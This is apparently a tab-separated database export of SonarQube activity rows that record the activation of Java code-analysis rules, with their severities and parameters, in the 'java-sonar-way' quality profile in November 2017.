160	2017-11-23 16:16:51.767	\N	key=java-sonar-way-86530:squid:S1166;ruleKey=squid:S1166;profileKey=java-sonar-way-86530;param_exceptions=java.lang.InterruptedException, java.lang.NumberFormatException, java.text.ParseException, java.net.MalformedURLException;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquQ3zJFC7L4qK5bl
161	2017-11-23 16:16:51.771	\N	key=java-sonar-way-86530:squid:S1190;ruleKey=squid:S1190;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquQ7zJFC7L4qK5bm
162	2017-11-23 16:16:51.775	\N	key=java-sonar-way-86530:squid:S1188;ruleKey=squid:S1188;profileKey=java-sonar-way-86530;param_Max=20;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquQ_zJFC7L4qK5bn
163	2017-11-23 16:16:51.779	\N	key=java-sonar-way-86530:squid:S1191;ruleKey=squid:S1191;profileKey=java-sonar-way-86530;param_Exclude=;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquRDzJFC7L4qK5bo
164	2017-11-23 16:16:51.783	\N	key=java-sonar-way-86530:squid:S135;ruleKey=squid:S135;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquRHzJFC7L4qK5bp
165	2017-11-23 16:16:51.786	\N	key=java-sonar-way-86530:squid:S1186;ruleKey=squid:S1186;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquRKzJFC7L4qK5bq
166	2017-11-23 16:16:51.79	\N	key=java-sonar-way-86530:squid:S1185;ruleKey=squid:S1185;profileKey=java-sonar-way-86530;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquROzJFC7L4qK5br
167	2017-11-23 16:16:51.794	\N	key=java-sonar-way-86530:squid:S1174;ruleKey=squid:S1174;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquRSzJFC7L4qK5bs
168	2017-11-23 16:16:51.798	\N	key=java-sonar-way-86530:squid:S1175;ruleKey=squid:S1175;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquRWzJFC7L4qK5bt
169	2017-11-23 16:16:51.801	\N	key=java-sonar-way-86530:squid:S1153;ruleKey=squid:S1153;profileKey=java-sonar-way-86530;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquRZzJFC7L4qK5bu
170	2017-11-23 16:16:51.805	\N	key=java-sonar-way-86530:squid:S1148;ruleKey=squid:S1148;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquRdzJFC7L4qK5bv
171	2017-11-23 16:16:51.808	\N	key=java-sonar-way-86530:squid:S1195;ruleKey=squid:S1195;profileKey=java-sonar-way-86530;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquRgzJFC7L4qK5bw
172	2017-11-23 16:16:51.812	\N	key=java-sonar-way-86530:squid:S1193;ruleKey=squid:S1193;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquRkzJFC7L4qK5bx
173	2017-11-23 16:16:51.816	\N	key=java-sonar-way-86530:squid:S1192;ruleKey=squid:S1192;profileKey=java-sonar-way-86530;param_threshold=3;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquRozJFC7L4qK5by
174	2017-11-23 16:16:51.82	\N	key=java-sonar-way-86530:squid:S1158;ruleKey=squid:S1158;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquRszJFC7L4qK5bz
175	2017-11-23 16:16:51.824	\N	key=java-sonar-way-86530:squid:S1215;ruleKey=squid:S1215;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquRwzJFC7L4qK5b0
176	2017-11-23 16:16:51.827	\N	key=java-sonar-way-86530:squid:S1197;ruleKey=squid:S1197;profileKey=java-sonar-way-86530;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquRzzJFC7L4qK5b1
177	2017-11-23 16:16:51.831	\N	key=java-sonar-way-86530:squid:S1220;ruleKey=squid:S1220;profileKey=java-sonar-way-86530;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquR3zJFC7L4qK5b2
178	2017-11-23 16:16:51.835	\N	key=java-sonar-way-86530:squid:S1221;ruleKey=squid:S1221;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquR7zJFC7L4qK5b3
179	2017-11-23 16:16:51.838	\N	key=java-sonar-way-86530:squid:S1199;ruleKey=squid:S1199;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquR-zJFC7L4qK5b4
180	2017-11-23 16:16:51.842	\N	key=java-sonar-way-86530:squid:S1214;ruleKey=squid:S1214;profileKey=java-sonar-way-86530;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquSCzJFC7L4qK5b5
181	2017-11-23 16:16:51.845	\N	key=java-sonar-way-86530:squid:S1201;ruleKey=squid:S1201;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquSFzJFC7L4qK5b6
182	2017-11-23 16:16:51.849	\N	key=java-sonar-way-86530:squid:S1210;ruleKey=squid:S1210;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquSJzJFC7L4qK5b7
183	2017-11-23 16:16:51.852	\N	key=java-sonar-way-86530:squid:S1206;ruleKey=squid:S1206;profileKey=java-sonar-way-86530;severity=BLOCKER	QPROFILE	ACTIVATED	\N	AV_pquSMzJFC7L4qK5b8
184	2017-11-23 16:16:51.855	\N	key=java-sonar-way-86530:squid:S1219;ruleKey=squid:S1219;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquSPzJFC7L4qK5b9
185	2017-11-23 16:16:51.858	\N	key=java-sonar-way-86530:squid:S1301;ruleKey=squid:S1301;profileKey=java-sonar-way-86530;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquSSzJFC7L4qK5b-
186	2017-11-23 16:16:51.861	\N	key=java-sonar-way-86530:squid:S1226;ruleKey=squid:S1226;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquSVzJFC7L4qK5b_
187	2017-11-23 16:16:51.865	\N	key=java-sonar-way-86530:squid:S1313;ruleKey=squid:S1313;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquSZzJFC7L4qK5cA
188	2017-11-23 16:16:51.868	\N	key=java-sonar-way-86530:squid:S1223;ruleKey=squid:S1223;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquSczJFC7L4qK5cB
189	2017-11-23 16:16:51.871	\N	key=java-sonar-way-86530:squid:S1319;ruleKey=squid:S1319;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquSfzJFC7L4qK5cC
190	2017-11-23 16:16:51.875	\N	key=java-sonar-way-86530:squid:S1213;ruleKey=squid:S1213;profileKey=java-sonar-way-86530;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquSjzJFC7L4qK5cD
191	2017-11-23 16:16:51.879	\N	key=java-sonar-way-86530:squid:S1444;ruleKey=squid:S1444;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquSnzJFC7L4qK5cE
192	2017-11-23 16:16:51.882	\N	key=java-sonar-way-86530:squid:S1452;ruleKey=squid:S1452;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquSqzJFC7L4qK5cF
193	2017-11-23 16:16:51.885	\N	key=java-sonar-way-86530:squid:S1481;ruleKey=squid:S1481;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquStzJFC7L4qK5cG
194	2017-11-23 16:16:51.888	\N	key=java-sonar-way-86530:squid:S1068;ruleKey=squid:S1068;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquSwzJFC7L4qK5cH
195	2017-11-23 16:16:51.891	\N	key=java-sonar-way-86530:squid:S1317;ruleKey=squid:S1317;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquSzzJFC7L4qK5cI
196	2017-11-23 16:16:51.895	\N	key=java-sonar-way-86530:squid:S1596;ruleKey=squid:S1596;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquS3zJFC7L4qK5cJ
197	2017-11-23 16:16:51.898	\N	key=java-sonar-way-86530:squid:MaximumInheritanceDepth;ruleKey=squid:MaximumInheritanceDepth;profileKey=java-sonar-way-86530;param_max=5;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquS6zJFC7L4qK5cK
198	2017-11-23 16:16:51.902	\N	key=java-sonar-way-86530:squid:UnusedPrivateMethod;ruleKey=squid:UnusedPrivateMethod;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquS-zJFC7L4qK5cL
199	2017-11-23 16:16:51.905	\N	key=java-sonar-way-86530:squid:RedundantThrowsDeclarationCheck;ruleKey=squid:RedundantThrowsDeclarationCheck;profileKey=java-sonar-way-86530;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquTBzJFC7L4qK5cM
200	2017-11-23 16:16:51.909	\N	key=java-sonar-way-86530:squid:S1160;ruleKey=squid:S1160;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquTFzJFC7L4qK5cN
201	2017-11-23 16:16:51.914	\N	key=java-sonar-way-86530:squid:S1217;ruleKey=squid:S1217;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquTKzJFC7L4qK5cO
202	2017-11-23 16:16:51.918	\N	key=java-sonar-way-86530:squid:S1862;ruleKey=squid:S1862;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquTOzJFC7L4qK5cP
203	2017-11-23 16:16:51.921	\N	key=java-sonar-way-86530:squid:S1488;ruleKey=squid:S1488;profileKey=java-sonar-way-86530;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquTRzJFC7L4qK5cQ
204	2017-11-23 16:16:51.925	\N	key=java-sonar-way-86530:squid:S1602;ruleKey=squid:S1602;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquTVzJFC7L4qK5cR
205	2017-11-23 16:16:51.929	\N	key=java-sonar-way-86530:squid:S1611;ruleKey=squid:S1611;profileKey=java-sonar-way-86530;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquTZzJFC7L4qK5cS
206	2017-11-23 16:16:51.932	\N	key=java-sonar-way-86530:squid:S1604;ruleKey=squid:S1604;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquTczJFC7L4qK5cT
207	2017-11-23 16:16:51.936	\N	key=java-sonar-way-86530:squid:S1610;ruleKey=squid:S1610;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquTgzJFC7L4qK5cU
208	2017-11-23 16:16:51.939	\N	key=java-sonar-way-86530:squid:S1609;ruleKey=squid:S1609;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquTjzJFC7L4qK5cV
209	2017-11-23 16:16:51.942	\N	key=java-sonar-way-86530:squid:S1700;ruleKey=squid:S1700;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquTmzJFC7L4qK5cW
210	2017-11-23 16:16:51.946	\N	key=java-sonar-way-86530:squid:S1172;ruleKey=squid:S1172;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquTqzJFC7L4qK5cX
211	2017-11-23 16:16:51.951	\N	key=java-sonar-way-86530:squid:S1710;ruleKey=squid:S1710;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquTvzJFC7L4qK5cY
212	2017-11-23 16:16:51.955	\N	key=java-sonar-way-86530:squid:S1598;ruleKey=squid:S1598;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquTzzJFC7L4qK5cZ
213	2017-11-23 16:16:51.96	\N	key=java-sonar-way-86530:squid:S1612;ruleKey=squid:S1612;profileKey=java-sonar-way-86530;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquT4zJFC7L4qK5ca
214	2017-11-23 16:16:51.964	\N	key=java-sonar-way-86530:squid:S1873;ruleKey=squid:S1873;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquT8zJFC7L4qK5cb
215	2017-11-23 16:16:51.968	\N	key=java-sonar-way-86530:squid:S1948;ruleKey=squid:S1948;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquUAzJFC7L4qK5cc
216	2017-11-23 16:16:51.972	\N	key=java-sonar-way-86530:squid:S1479;ruleKey=squid:S1479;profileKey=java-sonar-way-86530;param_maximum=30;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquUEzJFC7L4qK5cd
217	2017-11-23 16:16:51.976	\N	key=java-sonar-way-86530:squid:S1764;ruleKey=squid:S1764;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquUIzJFC7L4qK5ce
218	2017-11-23 16:16:51.98	\N	key=java-sonar-way-86530:squid:S1244;ruleKey=squid:S1244;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquUMzJFC7L4qK5cf
219	2017-11-23 16:16:51.984	\N	key=java-sonar-way-86530:squid:S2077;ruleKey=squid:S2077;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquUPzJFC7L4qK5cg
220	2017-11-23 16:16:51.986	\N	key=java-sonar-way-86530:squid:S1161;ruleKey=squid:S1161;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquUSzJFC7L4qK5ch
221	2017-11-23 16:16:51.989	\N	key=java-sonar-way-86530:squid:S1994;ruleKey=squid:S1994;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquUVzJFC7L4qK5ci
222	2017-11-23 16:16:51.992	\N	key=java-sonar-way-86530:squid:S2094;ruleKey=squid:S2094;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquUYzJFC7L4qK5cj
223	2017-11-23 16:16:51.996	\N	key=java-sonar-way-86530:squid:S1850;ruleKey=squid:S1850;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquUczJFC7L4qK5ck
224	2017-11-23 16:16:51.998	\N	key=java-sonar-way-86530:squid:S1905;ruleKey=squid:S1905;profileKey=java-sonar-way-86530;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquUezJFC7L4qK5cl
225	2017-11-23 16:16:52.001	\N	key=java-sonar-way-86530:squid:S2114;ruleKey=squid:S2114;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquUhzJFC7L4qK5cm
226	2017-11-23 16:16:52.004	\N	key=java-sonar-way-86530:squid:S1065;ruleKey=squid:S1065;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquUkzJFC7L4qK5cn
227	2017-11-23 16:16:52.007	\N	key=java-sonar-way-86530:squid:S2184;ruleKey=squid:S2184;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquUnzJFC7L4qK5co
228	2017-11-23 16:16:52.012	\N	key=java-sonar-way-86530:squid:S2225;ruleKey=squid:S2225;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquUszJFC7L4qK5cp
229	2017-11-23 16:16:52.015	\N	key=java-sonar-way-86530:squid:S2230;ruleKey=squid:S2230;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquUvzJFC7L4qK5cq
230	2017-11-23 16:16:52.018	\N	key=java-sonar-way-86530:squid:S2200;ruleKey=squid:S2200;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquUxzJFC7L4qK5cr
231	2017-11-23 16:16:52.02	\N	key=java-sonar-way-86530:squid:S2092;ruleKey=squid:S2092;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquU0zJFC7L4qK5cs
232	2017-11-23 16:16:52.023	\N	key=java-sonar-way-86530:squid:S1848;ruleKey=squid:S1848;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquU3zJFC7L4qK5ct
233	2017-11-23 16:16:52.029	\N	key=java-sonar-way-86530:squid:S2235;ruleKey=squid:S2235;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquU9zJFC7L4qK5cu
234	2017-11-23 16:16:52.033	\N	key=java-sonar-way-86530:squid:S888;ruleKey=squid:S888;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquVBzJFC7L4qK5cv
235	2017-11-23 16:16:52.037	\N	key=java-sonar-way-86530:squid:S2068;ruleKey=squid:S2068;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquVFzJFC7L4qK5cw
236	2017-11-23 16:16:52.04	\N	key=java-sonar-way-86530:squid:S2232;ruleKey=squid:S2232;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquVIzJFC7L4qK5cx
237	2017-11-23 16:16:52.043	\N	key=java-sonar-way-86530:squid:S1849;ruleKey=squid:S1849;profileKey=java-sonar-way-86530;severity=BLOCKER	QPROFILE	ACTIVATED	\N	AV_pquVLzJFC7L4qK5cy
238	2017-11-23 16:16:52.047	\N	key=java-sonar-way-86530:squid:S2236;ruleKey=squid:S2236;profileKey=java-sonar-way-86530;severity=BLOCKER	QPROFILE	ACTIVATED	\N	AV_pquVOzJFC7L4qK5cz
239	2017-11-23 16:16:52.05	\N	key=java-sonar-way-86530:squid:S1844;ruleKey=squid:S1844;profileKey=java-sonar-way-86530;severity=BLOCKER	QPROFILE	ACTIVATED	\N	AV_pquVSzJFC7L4qK5c0
240	2017-11-23 16:16:52.053	\N	key=java-sonar-way-86530:squid:S2251;ruleKey=squid:S2251;profileKey=java-sonar-way-86530;severity=BLOCKER	QPROFILE	ACTIVATED	\N	AV_pquVVzJFC7L4qK5c1
241	2017-11-23 16:16:52.056	\N	key=java-sonar-way-86530:squid:S2252;ruleKey=squid:S2252;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquVYzJFC7L4qK5c2
242	2017-11-23 16:16:52.059	\N	key=java-sonar-way-86530:squid:S2254;ruleKey=squid:S2254;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquVbzJFC7L4qK5c3
243	2017-11-23 16:16:52.063	\N	key=java-sonar-way-86530:squid:S2250;ruleKey=squid:S2250;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquVfzJFC7L4qK5c4
244	2017-11-23 16:16:52.065	\N	key=java-sonar-way-86530:squid:S2226;ruleKey=squid:S2226;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquVhzJFC7L4qK5c5
245	2017-11-23 16:16:52.068	\N	key=java-sonar-way-86530:squid:S2111;ruleKey=squid:S2111;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquVkzJFC7L4qK5c6
246	2017-11-23 16:16:52.072	\N	key=java-sonar-way-86530:squid:S2109;ruleKey=squid:S2109;profileKey=java-sonar-way-86530;severity=BLOCKER	QPROFILE	ACTIVATED	\N	AV_pquVozJFC7L4qK5c7
247	2017-11-23 16:16:52.075	\N	key=java-sonar-way-86530:squid:S2273;ruleKey=squid:S2273;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquVrzJFC7L4qK5c8
248	2017-11-23 16:16:52.078	\N	key=java-sonar-way-86530:squid:S2276;ruleKey=squid:S2276;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquVuzJFC7L4qK5c9
249	2017-11-23 16:16:52.081	\N	key=java-sonar-way-86530:squid:S2274;ruleKey=squid:S2274;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquVxzJFC7L4qK5c-
250	2017-11-23 16:16:52.084	\N	key=java-sonar-way-86530:squid:S2272;ruleKey=squid:S2272;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquVzzJFC7L4qK5c_
251	2017-11-23 16:16:52.087	\N	key=java-sonar-way-86530:squid:S2277;ruleKey=squid:S2277;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquV3zJFC7L4qK5dA
252	2017-11-23 16:16:52.091	\N	key=java-sonar-way-86530:squid:S2204;ruleKey=squid:S2204;profileKey=java-sonar-way-86530;severity=BLOCKER	QPROFILE	ACTIVATED	\N	AV_pquV7zJFC7L4qK5dB
253	2017-11-23 16:16:52.094	\N	key=java-sonar-way-86530:squid:S2178;ruleKey=squid:S2178;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquV-zJFC7L4qK5dC
254	2017-11-23 16:16:52.098	\N	key=java-sonar-way-86530:squid:S2116;ruleKey=squid:S2116;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquWCzJFC7L4qK5dD
255	2017-11-23 16:16:52.101	\N	key=java-sonar-way-86530:squid:S2157;ruleKey=squid:S2157;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquWFzJFC7L4qK5dE
256	2017-11-23 16:16:52.105	\N	key=java-sonar-way-86530:squid:S2275;ruleKey=squid:S2275;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquWJzJFC7L4qK5dF
257	2017-11-23 16:16:52.108	\N	key=java-sonar-way-86530:squid:S2151;ruleKey=squid:S2151;profileKey=java-sonar-way-86530;severity=BLOCKER	QPROFILE	ACTIVATED	\N	AV_pquWMzJFC7L4qK5dG
258	2017-11-23 16:16:52.111	\N	key=java-sonar-way-86530:squid:S2127;ruleKey=squid:S2127;profileKey=java-sonar-way-86530;severity=BLOCKER	QPROFILE	ACTIVATED	\N	AV_pquWPzJFC7L4qK5dH
259	2017-11-23 16:16:52.114	\N	key=java-sonar-way-86530:squid:S1860;ruleKey=squid:S1860;profileKey=java-sonar-way-86530;severity=BLOCKER	QPROFILE	ACTIVATED	\N	AV_pquWSzJFC7L4qK5dI
260	2017-11-23 16:16:52.117	\N	key=java-sonar-way-86530:squid:S2055;ruleKey=squid:S2055;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquWVzJFC7L4qK5dJ
261	2017-11-23 16:16:52.12	\N	key=java-sonar-way-86530:squid:S2118;ruleKey=squid:S2118;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquWYzJFC7L4qK5dK
262	2017-11-23 16:16:52.123	\N	key=java-sonar-way-86530:squid:S2066;ruleKey=squid:S2066;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquWbzJFC7L4qK5dL
263	2017-11-23 16:16:52.126	\N	key=java-sonar-way-86530:squid:S2065;ruleKey=squid:S2065;profileKey=java-sonar-way-86530;severity=MINOR	QPROFILE	ACTIVATED	\N	AV_pquWezJFC7L4qK5dM
264	2017-11-23 16:16:52.129	\N	key=java-sonar-way-86530:squid:S2061;ruleKey=squid:S2061;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquWhzJFC7L4qK5dN
265	2017-11-23 16:16:52.132	\N	key=java-sonar-way-86530:squid:S2176;ruleKey=squid:S2176;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquWkzJFC7L4qK5dO
266	2017-11-23 16:16:52.136	\N	key=java-sonar-way-86530:squid:S2130;ruleKey=squid:S2130;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquWozJFC7L4qK5dP
267	2017-11-23 16:16:52.14	\N	key=java-sonar-way-86530:squid:S2166;ruleKey=squid:S2166;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquWszJFC7L4qK5dQ
268	2017-11-23 16:16:52.143	\N	key=java-sonar-way-86530:squid:S2153;ruleKey=squid:S2153;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquWvzJFC7L4qK5dR
269	2017-11-23 16:16:52.146	\N	key=java-sonar-way-86530:squid:S2326;ruleKey=squid:S2326;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquWyzJFC7L4qK5dS
270	2017-11-23 16:16:52.15	\N	key=java-sonar-way-86530:squid:S2183;ruleKey=squid:S2183;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquW2zJFC7L4qK5dT
271	2017-11-23 16:16:52.153	\N	key=java-sonar-way-86530:squid:S2167;ruleKey=squid:S2167;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquW5zJFC7L4qK5dU
272	2017-11-23 16:16:52.156	\N	key=java-sonar-way-86530:squid:S2165;ruleKey=squid:S2165;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquW8zJFC7L4qK5dV
273	2017-11-23 16:16:52.159	\N	key=java-sonar-way-86530:squid:S2122;ruleKey=squid:S2122;profileKey=java-sonar-way-86530;severity=BLOCKER	QPROFILE	ACTIVATED	\N	AV_pquW_zJFC7L4qK5dW
274	2017-11-23 16:16:52.162	\N	key=java-sonar-way-86530:squid:S2134;ruleKey=squid:S2134;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquXCzJFC7L4qK5dX
275	2017-11-23 16:16:52.166	\N	key=java-sonar-way-86530:squid:S2175;ruleKey=squid:S2175;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquXGzJFC7L4qK5dY
276	2017-11-23 16:16:52.169	\N	key=java-sonar-way-86530:squid:S2447;ruleKey=squid:S2447;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquXJzJFC7L4qK5dZ
277	2017-11-23 16:16:52.173	\N	key=java-sonar-way-86530:squid:S2131;ruleKey=squid:S2131;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquXNzJFC7L4qK5da
278	2017-11-23 16:16:52.176	\N	key=java-sonar-way-86530:squid:S2437;ruleKey=squid:S2437;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquXQzJFC7L4qK5db
279	2017-11-23 16:16:52.179	\N	key=java-sonar-way-86530:squid:S2110;ruleKey=squid:S2110;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquXTzJFC7L4qK5dc
280	2017-11-23 16:16:52.182	\N	key=java-sonar-way-86530:squid:S2160;ruleKey=squid:S2160;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquXWzJFC7L4qK5dd
281	2017-11-23 16:16:52.185	\N	key=java-sonar-way-86530:squid:S1872;ruleKey=squid:S1872;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquXZzJFC7L4qK5de
282	2017-11-23 16:16:52.188	\N	key=java-sonar-way-86530:squid:S2440;ruleKey=squid:S2440;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquXczJFC7L4qK5df
283	2017-11-23 16:16:52.191	\N	key=java-sonar-way-86530:squid:S2441;ruleKey=squid:S2441;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquXfzJFC7L4qK5dg
284	2017-11-23 16:16:52.195	\N	key=java-sonar-way-86530:squid:S2123;ruleKey=squid:S2123;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquXizJFC7L4qK5dh
285	2017-11-23 16:16:52.199	\N	key=java-sonar-way-86530:squid:S2133;ruleKey=squid:S2133;profileKey=java-sonar-way-86530;severity=MAJOR	QPROFILE	ACTIVATED	\N	AV_pquXnzJFC7L4qK5di
286	2017-11-23 16:16:52.202	\N	key=java-sonar-way-86530:squid:S2154;ruleKey=squid:S2154;profileKey=java-sonar-way-86530;severity=CRITICAL	QPROFILE	ACTIVATED	\N	AV_pquXqzJFC7L4qK5dj
